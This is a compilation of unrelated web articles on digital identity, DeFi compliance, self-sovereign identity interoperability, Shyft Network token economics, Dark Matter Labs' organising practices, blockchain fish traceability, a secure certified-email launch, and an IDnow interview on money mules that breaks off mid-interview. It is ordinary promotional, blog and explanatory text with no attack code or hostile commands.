<p>It is true that the more complicated offerings like derivatives (i.e. futures, options) and high leverage trading require a degree of sophistication, but should elite banks decide who gets to participate? And why should those traders and investors who want to participate in DeFi be blocked from doing so, assuming appropriate guardrails are in place? At Civic we believe in the power of DeFi and the more level playing field it provides.</p>



 Is there a way to get the best of both worlds? 



<p>There are good reasons why KYC and AML guidelines need to be followed. However, until now the process of disintermediation of the traditional financial services stack has not allowed for both DeFi structures and compliance frameworks to enable the next wave of innovation.</p>



<p>Civic and our partners are working to change that with the introduction of Civic Pass:</p>



  



<p>With Civic Pass, our partners can move towards meeting KYC &amp; AML requirements with Civic’s SaaS compliance tools. These tool allows for participation with known counterparties and permissioned DeFi pools of liquidity.</p>



<blockquote><p>Ultimately, Civic’s vision is to provide the identity and compliance piece of the DeFi puzzle. We want to enable the complete disintermediation of CeFi and, more broadly, foster the adoption of identity and compliance structures for any on-chain project that needs them.</p></blockquote>



<p>At Civic we believe that the power of decentralization can be coupled with an on-chain identity layer in a way that adheres to regulatory requirements, accelerates the pace of innovation, enables the next 100 innovative blockchain companies and protects individual privacy. Civic is excited to continue to work with these innovators and regulators as we work towards true decentralization of the DeFi governance layer.</p>



<p>If you want to get a glimpse of what that future looks like, check out the first implementation of the Civic Pass solution with <a href="http://dex.solrise.finance/">our launch partner</a>.</p>

<p>Introduction</p>
<p>What use cases should a National Digital Identity program prioritize in collaboration with the private sector? As use cases become verticals of their own, what are then some of the horizontal considerations that need to be applied to enable all of the use cases to function within their relative ecosystems? Hakan Yildiz can help us answer these questions being that he’s a Research Associate at TU Berlin and a Consortium Partner at <a href="https://idunion.org/?lang=en">IDunion</a>.</p>
<p></p>
<p>&nbsp;</p>
<p>About Episode<br>
During this conversation, we discuss:</p>
 
 IDunion 101: a general overview, what are some of the early credentials being issued by government (people and legal entity VCs) and some of the existing ecosystem participants 
 IDunion Use Cases (Verticals): what are some of the government use cases (eHealth, eGov and Education)? What are some of the private sector use cases (Financial, Hospitality, IAM)? 
 IDunion Workstreams (Horizontals): governance, cybersecurity, wallet security, UX, interoperability and more.

 Le due società del Gruppo Tinexta offrono al mercato una soluzione unica, in grado di intercettare malware e truffe prima che possano entrare nella casella di posta 



<p>Roma, 04 ottobre 2021 – InfoCert, la più grande Autorità di Certificazione europea, e Yoroi, attiva nello sviluppo di sistemi integrati di difesa cibernetica, annunciano il rilascio di Legalmail Security Premium, una nuova soluzione di Posta Elettronica Certificata che si distingue per la capacità di combinare la forza legale della PEC con i più alti standard di sicurezza informatica.</p>



<p>Grazie alla collaborazione tra le due aziende, leader nei rispettivi settori di mercato, i clienti di Legalmail potranno avvalersi del servizio di protezione “Legalmail Security Premium”. Il servizio, basato sulla sandbox Yomi di Yoroi, consente di bloccare le comunicazioni sospette, intercettando e neutralizzando elementi malevoli come allegati e/o link prima della consegna del messaggio.</p>



<p>Il livello di sicurezza verrà così aumentato e sarà in grado di fronteggiare al meglio la nuova ondata di cyberattacchi, la cui efficacia è legata molto spesso alla capacità di ingannare gli utenti, inducendoli a cliccare su allegati o link all’apparenza innocui ma con conseguenze potenzialmente drammatiche. La PEC è diventata uno strumento irrinunciabile nella quotidianità, e per tale motivo un canale sempre più appetibile per gli attacchi informatici: basti pensare che, nel prima semestre del 2021, il numero di caselle attive ha superato i 13 milioni, per un totale di oltre 1 miliardo di messaggi scambiati.</p>



<p>“Aumentare i livelli di sicurezza della PEC è un impegno per noi inderogabile. Ciò è confermato anche dal recente rafforzamento di tutte le caselle Legalmail grazie alla possibilità di attivare l’autenticazione a doppio fattore (o strong authentication). Il bisogno di sicurezza non deve però intaccare la facilità d’uso e gli elevati livelli prestazionali che contraddistinguono il prodotto Legalmail e che ne decretano il successo di mercato: la sinergia con Yoroi ci ha consentito di rispondere in pieno a questa duplice sfida. Il risultato è una soluzione all’avanguardia che non ha eguali sul mercato, permettendo di agire da filtro attivo e intelligente a protezione dei nostri clienti”, commenta Carmine Auletta, Chief Innovation &amp; Strategy Officer di InfoCert.</p>



<p>“Il nostro lavoro è proteggere le persone in tutte le attività quotidiane. Molti attacchi ransomware verso la Sanità e le aziende cominciano cliccando su un link o un allegato malevoli. L’email è uno dei veicoli principali attraverso cui i cybercriminali cercano di entrare nella nostra casa virtuale e noi vogliamo fare tutto ciò che è possibile per impedirglielo”, conclude Marco Ramilli, Ceo di Yoroi.</p>



<p>InfoCert SpA</p>



<p>InfoCert, Tinexta Group, è la più grande Certification Authority europea, attiva in oltre venti Paesi. La società eroga servizi di digitalizzazione, eDelivery, Firma Digitale e conservazione digitale dei documenti ed è gestore accreditato AgID dell’identità digitale nell’ambito di SPID (Sistema Pubblico per la gestione dell’Identità Digitale). InfoCert investe in modo significativo nella ricerca e sviluppo e nella qualità: detiene un significativo numero di brevetti mentre le certificazioni di qualità ISO 9001, 27001 e 20000 testimoniano l’impegno ai massimi livelli nell’erogazione dei servizi e nella gestione della sicurezza. Il Sistema di Gestione della Sicurezza delle Informazioni InfoCert è certificato ISO/IEC 27001:2013 per le attività EA:33-35. InfoCert è leader europeo nell’offerta di servizi di Digital Trust pienamente conformi ai requisiti del Regolamento eIDAS (regolamento UE 910/2014) e agli standard ETSI EN 319 401, e punta a crescere sempre di più a livello internazionale anche mediante acquisizioni: detiene il 51% di Camerfirma, una delle principali autorità di certificazione spagnole e il 16,7% di Authada, Identity Provider tedesco all’avanguardia. InfoCert, infine, è proprietaria dell’80% delle azioni di Sixtema SpA, il partner tecnologico del mondo CNA, che fornisce soluzioni tecnologiche e servizi di consulenza a PMI, associazioni di categoria, intermediari finanziari, studi professionali ed enti.</p>



<p>Yoroi Srl – Tinexta Cyber SpA</p>



<p>Yoroi Srl è un’azienda che gestisce Sistemi Integrati Adattivi e Dinamici di Difesa Cibernetica e sviluppata tecnologie proprietarie che hanno ottenuto significativi riconoscimenti anche sul mercato internazionale.

Because of this fact, the anti-money laundering (AML), know your customer (KYC), and other financial crime-related obligations of investment advisors vary considerably from those of banks, broker-dealers, or other formal financial institutions. The risk attendant to these entities is, therefore, more pernicious than that related to entities with stricter regulatory oversight and more onerous reporting obligations.&nbsp;</p>

 What is interoperability, what needs to be done to achieve it in the SSI world, and what is the way forward? 



 Why can SSI end up like the tower of Babel? 



<p>There is a lot of activity in the SSI community. Different technological camps are coming together and are working on new common protocols and standards. The goal is to establish interoperability and eliminate security and privacy issues that have been identified in the current solutions. This is an extremely positive development. The community is optimistic and sometimes even euphoric.</p>



<p>BUT, SSI is getting more and more attention on the market. Projects are getting bigger and customers are pushing towards productive systems.  That brings the risk that “obsolete” protocols and/or self-developed ad-hoc solutions will be implemented. “SSI” newcomers see an attractive business opportunity and prioritize profit over SSI principles and commonly agreed protocols. This would result in implementations not being interoperable. In the worst case, we end up with implementations that are advertised as SSI but are proprietary and central systems. You could say a kind of “SSI-washing”.</p>



<p>A lot of discussions is about interoperability. But what does it really mean for all the developers like Jolocom? In this logbook entry, I try to structure the term and make it more tangible.</p>



 Different levels of interoperability 



<p>The German Wikipedia entry for interoperability is a good starting point to explain the different levels (<a href="https://de.wikipedia.org/wiki/Interoperabilit%C3%A4t">link</a>). Sorry to all non-German speaking readers, but you don’t need to read the Wikipedia entry. The explanation decides between the following levels of interoperability:</p>



  the structural level addresses the exchange of data,  the syntax level  addresses the extraction of the data,  the semantic level addresses the interpretation of the data and   the organizational level is dealing with the processes.  



<p>Our goal is pretty clear. We want that different actors/modules/implementations can communicate and exchange data. Furthermore, it is important that the data can be extracted so that they can be interpreted on a semantic level.</p>



<p>The differentiation between syntax and semantic level can be tricky. The following example is taken from <a href="https://www.w3.org/TR/vc-data-model/">W3C Verifable Credential Data Model</a>.  </p>



<p><code>"name": "Jayden Doe",</code></p>



<p>On the syntax level, I only know that the above example is an attribute and it contains a value. But I have no clue what it means. On the semantic level, I know that the attribute presents a name and the name is “Jayden Doe”.</p>



<p>The semantic and the organizational interoperability level are in the influence sphere of the specific use case and are independent for the actual software development process. Because of that we only focus on the structural- and syntax level of interoperability.</p>



 How Interoperability can be achieved? 



<p>How we can achieve interoperability on the structural- and syntax level? We have several options. Simplified, we have the following options:</p>



  We can use the same software,  we can build software on unified standards and protocols or  we develop “Middelware” acting as a translator between different systems.  



<p>To pick the right option we have to take a look at the goals and framework conditions of SSI.</p>



 What are the goals of SSI and which option can be derived from? 



<p>Self Sovereign Identities should be an open public digital infrastructure for all. Therefore, it must be open source and accessible for all. With this requirement a SSI Infrastructure cannot be one software from one supplier. A single software implementation would be a huge barrier, and it would not support innovation and development.</p>



<p>Another important SSI requirement is privacy. A middleware – a translator between systems – would violate privacy goals. If the communication is routed through a middleware for translation, the middleware knows what, when and with whom information is shared, not good.</p>



<p>The only option left is unified standards and protocols. This is the only way to ensure an open ecosystem without violating SSI goals like privacy or face a vendor lock-in.</p>



<p>We all have to work hard on the goal to speak the same language and avoid a Babel-like fate.</p>



<p>Join us at the <a href="https://internetidentityworkshop.com/schedule/">33. Internet Identity Workshop from 12-14. of October</a>. We will run a session about interoperability and discuss how we can achieve it.</p>

 Wieso kann SSI, wie der Turmbau zu Babel enden? 



<p>Im Moment ist in der SSI community einiges in Bewegung. Verschiedene technologische Lager gehen aufeinander zu und man entwickelt ein gemeinsames Verständnis, definiert neue Protokolle und Standards. Diese sollen und werden Interoperabilität herstellen und Sicherheits- und Datenschutzprobleme, die man erkannt hat, beseitigen. Dies ist eine überaus positive Entwicklung und man spürt die Aufbruchsstimmung und Euphorie.</p>



<p>ABER dadurch, dass SSI immer mehr Aufmerksamkeit bekommt, Projekte größer werden und die Entwicklung in Richtung Produktivsysteme geht, steigt auch der Druck. Dies bringt eine große Gefahr mit sich, dass überhastet obsolete Protokolle oder/und eigene ad-hoc Lösungen implementiert werden. Auch “SSI” Neueinsteiger wittern ein attraktives Geschäftsfeld und räumen Profit und Marktanteilen Vorrang gegenüber der SSI Idee ein. Dies würde dazu führen, dass Implementierungen nicht interoperabel sind. Im schlimmsten Fall landen wir bei Implementierungen, die mit SSI beworben werden, aber im Grunde proprietäre und zentrale Systeme sind. Man könnte sagen “SSI-washing”.</p>



<p>Ein Begriff Interoperabilität ist in der SSI Community und in Projekten in aller Munde. Aber was bedeutet Interoperabilität für Softwarehersteller wie Jolocom? In diesem Blogpost versuche ich den Begriff zu strukturieren und greifbar zu machen.</p>



 Ebenen von Interoperabilität 



<p>Der deutsche Eintrag zu Interoperabilität in Wikipedia ist ein guter Startpunkt um die Dinge einzuordnen (<a href="https://de.wikipedia.org/wiki/Interoperabilit%C3%A4t">link</a>). Darin wird zwischen struktureller-, syntaktischer-, semantischer- und organisatorischer    Interoperabilität unterschieden. </p>



  Strukturelle Interoperabilität bezieht sich auf den Austausch von Daten,  Syntaktische auf die Extraktion der Daten,  Semantische auf die Interpretation und  Organisatorische bezieht sich auf die Prozesse.   



<p>Das Ziel ist klar, wir wollen, dass verschiedene Komponenten in einem SSI System miteinander kommunizieren und Daten austauschen können. Des Weiteren ist es wichtig, dass sie diese Daten auch extrahiert werden können, damit sie danach semantisch interpretiert werden können. </p>



<p>Die Unterscheidung zwischen Syntax und Semantik kann schwierig sein. Das folgende Beispiel ist ein Auszug aus dem <a href="https://www.w3.org/TR/vc-data-model/">W3C Verifable Credential Data Model</a>.  Anhand diesem erläutere ich den Unterschied. </p>



<p><code>"name": "Jayden Doe",</code></p>



<p>Auf der syntaktischen Ebene, weiß ich nur, dass der erste Begriff <code>"name"</code> ein Attribut ist und der zweite <code>"Jayden Doe"</code>, der Wert. Ich weiß aber nicht was es bedeutet. Auf der semantischen Eben weiß ich, dass das Attribut den Namen darstellt und der Name “Jayden Doe” ist.</p>



<p>Semantische und organisatorische Interoperabilität liegen in der Einflusssphäre des jeweiligen Anwendungsfalls und sind von der eigentlichen Softwareherstellung zum größten Teil unabhängig. Daher ist für die weitere Betrachtung die strukturelle und die syntaktische Interoperabilität von Relevanz.</p>



 Wie kann man Interoperabilität herstellen? 



<p>Wie kann strukturelle und syntaktische Interoperabilität hergestellt werden? Dafür gibt es verschiedene Wege. Man kann, vereinfacht gesagt</p>



  eine einheitliche Software verwenden oder  Protokolle und Standards definieren oder  “Middelware” entwickeln die zwischen den verschiedenen Systemen als  Übersetzer agiert.  



<p>Um die passende Möglichkeiten auszuwählen, muss man sich Ziele und Rahmenbedingungen vor Augen führen.</p>



 Was sind die Ziele von SSI und welcher Weg leitet sich dadurch ab? 



<p>SSI oder dezentrale Identitäten soll eine öffentliche digitale Plattform für alle sein. Es muss open source und für alle zugänglich sein. Mit diesen Zielen fällt die erste Möglichkeit weg. Eine einheitliche Software für alle würde eine sehr starke Beschränkung darstellen. Innovation würde nicht gefördert werden und der Zugang könnte eingeschränkt werden. </p>



<p>Ein wichtiges weiteres Ziel von SSI ist der Datenschutz, eine Middleware (Übersetzer), also die dritte Möglichkeit, würde dieses Ziel gefährden. Wenn die Kommunikation über einen Übersetzer stattfindet, muss dieser alles mithören, sonst kann er nicht übersetzen. Es muss auch nicht auf bestehende SSI Systeme in Produktion Rücksicht genommen werden. Altlasten und viele verschiedene Systeme sind oft Grund für den Einsatz von Middleware.</p>



<p>Was bleibt also Möglichkeit Nummer zwei. Man muss sich auf einheitliche Protokolle und Standards einigen. Nur so kann sichergestellt werden, dass es keine Einschränkung auf einen Hersteller gibt, der Datenschutz sichergestellt ist und alle Implementierung miteinander sprechen können und somit interoperabel sind.</p>



<p>Wir müssen uns alle gemeinsam anstrengen, dass wir bei einer Sprache bleiben und den SSI Turmbau vollenden. </p>



<p>Wenn Interesse besteht, kommt zum <a href="https://internetidentityworkshop.com/">33. Internet Indentity Workshop vom 12-14. Oktober</a> (Onlineevent). Wir werden eine Session zum Thema halten, um das Thema in der Community zu diskutieren.</p>

 The Shyft Network Token Distribution and Economics — Part&nbsp;3  The Shyft Network Token Economics after the release of&nbsp;mainnet. <p>Hello everyone, Shyft Network has officially launched! We’ve laid the foundation for an entire network that will solve complex problems like institutional adoption and multi-jurisdictional regulation. As the blockchain ecosystem quickly scales before our eyes, the industry is now starting to feel the effects of present-day regulations. The need for a solution, like Shyft Network, has never been more&nbsp;urgent.</p><p>The work is not over as we prepare for the next steps, i.e., continuous protocol improvement, community and ecosystem development, and other incredible products on our pipeline. We decided to publish this post to clarify our token distribution and liquidity schedules now that the mainnet is&nbsp;live.</p> Overview  Inflation <p>In the original Token Economics blog post, we explained that the Network Inflation rate was set at 6% of the Initial Token Universe, i.e., 2,520,000,000 tokens, distributed gradually over several years. The Network Inflation rate is composed of three main elements:</p><p>A. Shyft Runtime Inflation DAO’s — 2%: Perpetual Community Funding and Ongoing Ecosystem Wide Resource Maintenance.</p><p>B. Strong Federation — 2%: Inflation per block is generated to pay for the cost of security; all network transactions fees are eliminated through&nbsp;EIP1559.</p><p>C. Byfrost — 2%: Inflation routed to openly pay for the cost of public bridge nodes for asset-weighted Proof of&nbsp;Stake.</p><p>The launch of the mainnet slightly modified the distribution schedule by delaying the Strong Federation component for, roughly, 3.5 months. This component will also be optimized right after the next mainnet hard-fork as the network introduces improvements like EIP1559 (similar to what Ethereum is going through in the next few&nbsp;weeks).</p><p>Another component of token inflation that changed is the Byfrost Bridge staking, which isn’t currently accumulating and will not count towards circulating supply until Byfrost launches later this&nbsp;year.</p><p>The Runtime Inflation DAO component IS accumulating, and we are working on building the DAO structure, governance components and deployment schedule for this to become available as soon as possible.</p><p>Please note also that we reduced the Advisor allocation by 1.28%, from 5.68% to&nbsp;4.4%.</p> Distribution of the Initial Token&nbsp;Universe <p>Note: The Economic Metagame represents 20% of the Initial Token Universe. It’s a deflationary incentive mechanism.</p><p>As users participate in the Wrap Rewards context, there will be a deflationary reduction in the total universe corresponding to the proportion of total assets (E.g. USDT erc20 token) within the Wrap Rewards contract. 20% of the total initial universe is available to be burned over the first 2 years (if lower, will move to further&nbsp;years).</p><p>The Initial Token Universe can be divided into four main categories to show their nature and destination.</p> DAO-Related Assets <p>DAO Related assets represent all buckets destined for community DAOs and other AMM structures to incentivize the growth and development of our community and our network. These funds are not immediately available to the Shyft Network core team or the Shyft Node Federation.</p> Partner and Purchaser Distributions <p>These allocations represent all SHFT tokens that have been sold, distributed, or granted to early token purchasers, strategic and technical partners, advisors, and early supporters of the&nbsp;project.</p> Treasury-Related Assets <p>These buckets represent SHFT tokens that are currently or will be available to the Shyft Network for the ecosystem, business, and partnership development, subject to distribution locks and schedules.</p> Inflationary Mechanics <p>As discussed in our original Token Economics blog post, the Shyft Network has an inflationary component meant to incentivize the creation and continuity of the Node Federation, allowing for the creation of future DAOs for community expansion.</p> Wrapping up <p>For the purposes of calculating circulating supply, the starting date of distribution schedules is March 26,&nbsp;2021.</p><p>You can find our Shyft Network block explorer here: <a href="https://bx.shyft.network/">Shyft POA&nbsp;Explorer</a></p><p>For updated information on Shyft Network’s token supply, please check out <a href="https://coinmarketcap.com/currencies/shyft-network/">Shyft Network, SHFT live marketcap, chart, and info | CoinMarketCap</a>.</p><p>Shyft Network aggregates trust and contextualizes data to build an authentic reputation, identity, and creditability framework for individuals and enterprises.</p><blockquote>Join our <a href="https://www.shyft.network/signup?userType=network">Newsletter</a></blockquote><blockquote>Telegram (<a href="https://t.me/shyftnetwork">https://t.me/shyftnetwork</a>)</blockquote><blockquote>Follow us on Twitter (<a href="https://twitter.com/shyftnetwork">https://twitter.com/shyftnetwork</a>)</blockquote><blockquote>Check out our GitHub (<a href="https://github.com/ShyftNetwork">https://github.com/ShyftNetwork</a>)</blockquote><blockquote>Check out our website (<a href="https://www.shyft.network/">https://www.shyft.network</a>)</blockquote><blockquote>Check out our Discord (<a href="https://discord.gg/ZcBNW37t">https://discord.gg/ZcBNW37t</a>)</blockquote>

 Our emerging operating logic and how it&nbsp;feels <p>This piece was authored by a member of the Dark Matter Labs team based in the UK as part of the #BeyondtheRules project and, as such, is written in British English and may have particular references to contexts in the&nbsp;UK.</p><p>This blog was written in September 2021 and reflects our learning at that&nbsp;time.</p> Our Context <p>In a context of climate breakdown and technological disruption, Dark Matter Labs works to accelerate societal transition towards collective care, shared agency, long-termism and interconnectedness. We focus on the dark matter — the invisible structures responsible for producing the majority of the world around us, from policy and regulation to finance and data, governance and democratic participation, organisational culture and identity. What we seek to build in the wider world we look to create at a smaller scale in how we organise together.</p><p>Our context as an organisation, and from which the learning that we share here is anchored, is largely defined by&nbsp;being:</p>  A platform for shared&nbsp;missions  Focused on discovery and&nbsp;learning  International with a planetary view  Primarily virtual  Evolving constantly  <p>In <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dark-matter-labs-e59e4f5dd32f">blog 1</a> in this series, we have explored the plural platform for shared missions that drive our work and we looked at some of the foundations that we have built to work with international plurality. In <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dml-2-4-ef87a1e466c">blog 2</a>, we explored how we compound learning and build legibility in the system to improve our efficacy and how we navigate. In <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dark-matter-labs-3-4-73faf8b283e7?source=collection_home---2------0-----------------------">blog 3</a>, we discussed our system of democratic agency and the foundation of care that underpins it. These elements form a foundation for the mission that we work on together, and manifest the meta shifts in mental models and organising logic that we wish to see in the world at the micro-level.</p><p>In this blog, we’ll look at how these various factors come together into an operating ‘logic’, and what it feels like to work like this, as told by people from the Dark Matter Labs team. We’ll then share more about how we structure this organising/operating at DM and how it manifests.</p> Operating Logic <p>The image above seeks to visualise how the core parts of our operating model work together. It also highlights our thinking and practice around where we believe we need consensus in our work and where we need a deep divergence of thought. Namely, that our very broad shared intentions (at the level of the meta-mission) and our mutual obligations to each other are where consensus feels needed. Whilst in the actual what and how of what we create requires many different perspectives and visions for deep learning, creativity and efficacy to be possible. This broad and open consensus of purpose alongside a deep plurality of means and approaches — sat on a platform not of control of each other, but of elevation and ennoblement of each of us — forms the foundation of our&nbsp;work.</p><p>In the coming months, we hope to codify some of our mutual obligations and expectations on how we make and evolve decisions and rules together through a DM constitution that will underpin our work (this is not yet in&nbsp;place).</p> What does this feel&nbsp;like? <p>In this blog series, we’ve tried to share what we are experimenting with at DML around how we organise and what we’ve been learning as we go. We are stumbling, learning and gradually improving still with so much to discover. In this section, we wanted to share what this way of working feels like, straight from the mouths of the team. One week ago an invitation was sent to the whole team inviting them to answer this one question, as&nbsp;follows:</p><blockquote>Preface:</blockquote><blockquote>“As part of writing the next beyond the rules blog we are hoping to give people an idea not only of what how we organise at DM looks like, but what it feels&nbsp;like.</blockquote><blockquote>We would simply love to hear anything you have to share on this to help ground this blog in our reality and make it more&nbsp;human.</blockquote><blockquote>If you have a spare 5 mins please take the time to share thoughts on what working at DM feels like for you it would be hugely appreciated (everything welcome, it’s not a propaganda platform) Everything will be anonymous.”</blockquote><blockquote>Question:</blockquote><blockquote>‘How does it feel — your experience of how we organise at DM? (Answer this any way you&nbsp;like)”</blockquote><p>These were all of the 21 (around 40% of the team) responses in&nbsp;full:</p>What how we organise at DM feels like, as shared by the&nbsp;team<p>The variety of experiences that people have, often at the same time, is one of the aspects that stands out: ‘coherence and incoherence’; ‘liberating and paralysing’; ‘uncomfortable, exhilarating an enriching’; ‘stressful and liberating’. Working like this can feel like many things for people, but rarely does it feel easy or&nbsp;static.</p> Stewarding how we&nbsp;organise <p>As our work and system has grown in scale and complexity, how we organise has required increasing nuance and intention.</p><p>An increasingly growing group of people who have worked on this approach to organising (what we call ‘the dark matter of dark matter’&nbsp;;) ) has made this evolution possible. They have asked questions, identified needs, spotted patterns, built experiments, gathered feedback, designed deeply and introduced and iterated new processes, mechanisms, structures and spaces with care. It is indeed because of the distributed agency in our system that this has been possible, and here we seek to share more on how we steward&nbsp;this.</p><p>We were inspired by the incredible team at <a href="https://civicsquare.cc/">Civic Square</a>, and their ‘block party’ in collaboration with <a href="https://wearesnook.com/">Snook</a>, to map out on&nbsp;<a href="https://kumu.io/">Kumu</a>:</p>  What we might see as ‘pillars’ of how we organise (which will evolve as our understanding of these develops).  The various areas/domains of work that make up these pillars, and their connections to each&nbsp;other.  The people who are working on each area, with domain holders versus domain supporters clarified by the direction of the&nbsp;arrows.  <p>Together these elements give us a dynamic map of our organising system that is easily editable and navigable and can quickly be iterated as the system and our understanding of it&nbsp;evolves.</p>A Kumu map showing DML operating pillars of work, their domains and the people who hold and support&nbsp;them<p>We can zoom into this map to make visible different elements. For example, the domains of work that contribute towards a pillar, such as ‘Compounding Learning’.</p>A section from the Kumu map showing the Compounding Learning pillar and its supporting domains of&nbsp;work<p>Or how domains connect to each other and who works on it. For example, our formal governance domain (for want of a better term — meaning our company articles &amp; legal documents, their membership &amp; voting structures, the company boards and directors and the agreements between the various companies) and how we approach that is deeply linked to our legal and financial architecture, roles and responsibilities, shared spaces and culture and our financial sense-making. There are many people involved in making this ‘formal governance’ possible.</p>A section of the Kumu map showing the Formal Governance domain, who works on it and how it links to other domains of&nbsp;work<p>The people who make up this team and the time they dedicate to it is regularly in flux. It includes:</p>  A core team of 7 (moving towards 9) from across our varied geographies with currently around 5.5FTE of capacity, who mainly also work in some other projects of DM but spend most of their time on our operations and how we&nbsp;organise  A couple of team members who spend around 1.5days/week each in how we organise, whilst being heavily focused on our strategic pipeline, partners and direction of work, bringing this insight into our operations  4–6 team members who work primarily on projects in different geographies but spend a small amount of time (up to 1/2 day/week) on supporting how we organise, either because of specialist skills and/or geographical insight  Various team members who have an interest in particular areas of work and contribute from time to&nbsp;time  All team input every now and again (e.g. new approaches to pay or agreeing a DM constitution)  <p>Generally, we spend around 10–15% of our total team capacity on our operations/organising (it fluctuates, but we notice that investing below 10% means that we get behind, and closer to 15% allows us to keep better on top of needs). About 40% this time is towards maintaining necessary day to day operating systems (such as recruitment, contracts, bookkeeping, payroll, company legal requirements etc) and about 60% in investing in our broader organising philosophy and improved ways of&nbsp;working.</p><p>This group does not perform a central function of control for Dark Matter Labs, and it is not a team that sees itself as in service of the ‘actual work’. To reference<a href="https://twitter.com/ImmyKaur/status/1441021905587343360?s=20"> this beautifully worded comment</a> by Immy Kaur, this part of our work is a site of responsibility and craft in being “the beating heart, core function, soil from which everything flows”.</p><p>As such, the Finance Holder does not tell the team what they can or can’t spend; rather, they help to make sense of our financial information; share insights in a variety of ways; and steward our financial agreements so that people across the system can make independent and informed financial choices. Similarly, the People Holder does not make the hiring decisions; rather, they build insight, research and deep knowledge about beautiful hiring processes; and support teams to hire in a way that is caring for applicants and effective in its&nbsp;outcome.</p> Thank you <p>Thank you for reading, we hope that this blog series provides some insight into what we have been learning at Dark Matter Laboratories in how we’ve been organising. We have only been able to cover some of the factors involved, and haven’t even touched up the work of hiring, onboarding, people policy, offboarding, governance and so much more. We intend to continue sharing what we learn and thank those who we have learned from, built upon and been inspired by along the&nbsp;way.</p><p>This blog is part of a 4-part series on how we organise and govern at Dark Matter Labs, with other blogs&nbsp;here:</p>  <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dark-matter-labs-e59e4f5dd32f">Organising beyond the rules #1 of 4: an international platform for&nbsp;mission</a>  <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dml-2-4-ef87a1e466c">Organising beyond the rules #2 of 4: compounding learning and constructing legibility</a>  <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dark-matter-labs-3-4-73faf8b283e7">Organising beyond the rules #3 of 4: Distributed Agency, Distributed Care</a>  <p>We are so very grateful for the support that we have had from our fellow co-creators in the ecosystem throughout these years at Dark Matter Labs, such as Architecture 00, Civic Square, Radicle, Vinnova, McConnell Foundation, Lankelly Chase, ThirtyPercy, MIS Maison de l’innovation sociale, NatureScot, Climate-KIC, Google Ventures, One Project, The National Lottery Community Fund, UNDP, Morgan Stanley Sustainable Solutions Collaborative and many&nbsp;others.</p><p>Much of what we have piloted in the last year has been supported by our learning through the #BeyondtheRules project, alongside our partners <a href="https://lankellychase.org.uk/">Lankelly Chase</a>, <a href="http://blackthrive.org/">Black Thrive</a>, <a href="https://www.yorkmcn.org/">York MCN Network</a> and <a href="https://www.demsoc.org/">The Democratic Society</a>.

        <p>Bachelor thesis by Vemund Holte Igesund &amp; Fredrik Sebastian Rognstad – Molde University College</p>
<p>Our bachelor thesis sheds light on the problem consumers have when buying fish products. At the time of purchase, consumers have little to no information about the products, and have no choice but to trust all the players in the product’s supply chain. After reading through articles and studies, it turns out that there are a high number of seafood scammers. One solution we have found is for players to use better traceability systems. The requirement for tracking today is a “one up, one down” system. Every actor in a supply chain only needs to know who they are buying the product from, and who they are selling it to, one step up and one step down.</p>
<p>The aim of our case study has been to find out what we as consumers had to do to get the history of three selected fish products from different grocery stores and a fish product from a restaurant. We tried to trace all the products back to the fisherman / breeder and map the supply chains. After trying to track fish products ourselves, we conclude that the “one up, one down” model is not good enough. We also conclude that the traceability systems actually implemented today are not transparent enough for consumers. We have found a possible solution to the problem that will have the opportunity to make the supply chain of fish products more transparent to consumers. It is a traceability system that uses blockchain technology.</p>
<p>The reason why we have chosen blockchain as a possible solution to the problem comes from three of the characteristics of blockchain: immutable, transparent and decentralized. In the work on our task, we were much in dialogue with the company UNISOT, which has recently developed a traceability system that uses blockchain technology for tracking fish products. In the conclusion, we discuss, among other things, what our case study would have looked like if the fish products from Experiments A to D had been integrated into a traceability system such as UNISOT has developed.</p>

<p>During <a href="mailto:https://www.idnow.io/blog/ensure-player-friendly-id-verification/">the EURO 2020 tournament</a>, our ID verification platform picked up a higher number of fraudulent activities across several clients. In the investigation, our fraud agents found patterns of what could be organized crime attacking specific organizations such as ‘Money Mules’.</p>
<p>By leveraging both machine learning and AI solutions as part of our IDnow platform as well as fraud specialists, fraudulent processed ID’s and activities could be successfully identified, and countermeasures initiated.</p>
<p>Incidents like big sports tournaments where the numbers of ‘Money Mules’ drastically spike are where our IDnow QM Manager such as Philomena and Michał come into play. In our interview today we will get to the bottom of ‘Money Mules’ and discuss recruiting tactics and patterns of fraudsters as well as overall consequences for detected ‘Money Mules’.</p>
  
 Philomena, Michał, let us start with the question of what your responsibilities are at IDnow as a QM Manager? 
<p>Philomena: Our team covers two essential parts to ensure that the quality expectations are met for both customers and users. Firstly, we ensure that our agents are aware and follow the high verification standards, which we have to fulfil from a regulatory point of view. Also, we want to ensure that our users have a pleasant experience going through the verification process.</p>
<p>Michał: The second part is to ensure that fraud attempts are prevented. We feel responsible for assisting our users and customers to not fall for fraud patterns.</p>
<p>Therefore, we analyse detected fraud cases, inform agents what to watch out for, and proactively reach out to our customers when we suspect patterns to find a solution immediately, such as when “Money Mules” are active.</p>
 ‘Money Mules’ is a term that often appears in the financial crime world, but also generally in the business world. Probably everyone has a rough idea about it, but in your experience within the identity industry, how would you define ‘Money Mules’? 
<p>Michał: A ‘Money Mule’ is a person who voluntarily provides their data, motivated by the desire to make easy money as criminals offer fast cash for participation in the fraud procedure. They are often fully aware of breaking the law. But there is no proof that they are fully conscious of all the consequences.</p>
<p>The overall process of “Money Mules” looks like that they either open a bank account themselves, and thereafter give an access and total control to criminals. Alternatively, the fraudsters open the accounts with their data. Both ways enable later to perform various financial embezzlement, e.g., money laundering, modern slavery or terrorist finance.</p>
<p>Philomena: It is also very important to differentiate between ‘Money Mule’ and ‘Social Engineering’ scenarios. ‘Money Mules’ are participating in the fraud scenarios, cooperating as part of the criminal schemes.</p>
<p>In a social engineering scenario, a person is considered a victim of a scam. Their collaboration with the fraudster is not as apparent as they get involved through psychological manipulation. These victims are usually unaware that their actions are breaking the law. They are being tricked into opening accounts, for example, through job advertisements.</p>
 Can you give us an example of a Money Mule case that you encountered? What was your learning? 
